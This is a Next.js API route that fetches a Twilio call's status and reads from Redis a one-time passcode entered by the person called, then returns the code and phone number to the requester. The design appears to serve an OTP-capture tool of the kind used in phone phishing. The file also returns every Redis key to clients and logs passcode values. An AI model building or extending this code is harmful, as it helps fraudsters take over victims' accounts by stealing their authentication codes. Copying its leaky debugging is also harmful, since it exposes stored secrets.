//app/api/check-call-status/route.ts

import { NextRequest, NextResponse } from 'next/server';
import twilio from 'twilio';
import { Redis } from '@upstash/redis';

const ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID!;
const AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN!;

const client = twilio(ACCOUNT_SID, AUTH_TOKEN);
const redis = Redis.fromEnv();

// Map Twilio status to more user-friendly descriptions
const STATUS_MAPPING: { [key: string]: string } = {
  'queued': 'Queued - Call is waiting to be processed',
  'ringing': 'Ringing - Call is being connected',
  'in-progress': 'In Progress - Call is active',
  'completed': 'Completed - Call has finished successfully',
  'busy': 'Busy - Recipient is unavailable',
  'failed': 'Failed - Call could not be completed',
  'no-answer': 'No Answer - Recipient did not pick up',
  'canceled': 'Canceled - Call was stopped before completion'
};

export async function POST(req: NextRequest) {
  try {
    // Parse the request body safely
    const body = await req.text();
    const { callSid } = JSON.parse(body);

    if (!callSid) {
      return NextResponse.json({ error: 'Call SID is required' }, { status: 400 });
    }

    // Log all Redis keys to help with debugging
    const redisKeys = await redis.keys('*');
    console.log('All Redis Keys:', redisKeys);

    // Try all possible OTP key formats
    const otpKeys = [
      `otp:${callSid}`,
      `call:${callSid}:otp`,
      `${callSid}:otp`
    ];

    let otpCode = null;
    for (const key of otpKeys) {
      otpCode = await redis.get(key);
      if (otpCode) {
        console.log(`Found OTP under key: ${key}, Value: ${otpCode}`);
        break;
      }
    }

    // Retrieve the call information from Redis
    const callInfoString = await redis.get(`call:${callSid}`);
    
    if (!callInfoString) {
      return NextResponse.json({ error: 'Call not found' }, { status: 404 });
    }

    // Safely parse the call info
    let callInfo: { 
      phoneNumber?: string, 
      status?: string,
      otpCode?: string
    } = {};

    try {
      const parsedInfo = typeof callInfoString === 'string' 
        ? JSON.parse(callInfoString) 
        : callInfoString;
      
      callInfo = parsedInfo || {};
    } catch (parseError) {
      console.error('Error parsing call info:', parseError, callInfoString);
    }

    // Fetch the latest call status from Twilio
    let twilioCallStatus = '';
    try {
      const twilioCall = await client.calls(callSid).fetch();
      twilioCallStatus = twilioCall.status;
      console.log('Twilio Call Status:', twilioCallStatus);
    } catch (twilioError) {
      console.error('Error fetching Twilio call status:', twilioError);
    }

    // Determine the most up-to-date status
    const status = twilioCallStatus || callInfo.status || 'unknown';

    // Determine OTP display logic with enhanced logging
    let otpDisplay = null;
    if (otpCode) {
      // OTP code was entered and stored
      otpDisplay = otpCode;
      console.log(`OTP found: ${otpDisplay}`);
    } else if (status === 'completed') {
      // Call is completed and no OTP was entered
      otpDisplay = 'No OTP received';
      console.log('Call completed, no OTP found');
    } else {
      console.log('Call not completed, OTP not yet available');
    }

    // Combine the stored info with the latest Twilio status
    const responseData = {
      phoneNumber: callInfo.phoneNumber || null,
      status: status,
      statusDescription: STATUS_MAPPING[status] || 'Unknown Status',
      otpCode: otpDisplay,
      debugInfo: {
        redisKeys,
        callInfoParsed: callInfo,
        twilioCallStatus
      }
    };

    return NextResponse.json(responseData);
  } catch (error) {
    console.error('Error checking call status:', error);
    return NextResponse.json({ error: 'Failed to check call status', details: error instanceof Error ? error.message : 'Unknown error' }, { status: 500 });
  }
}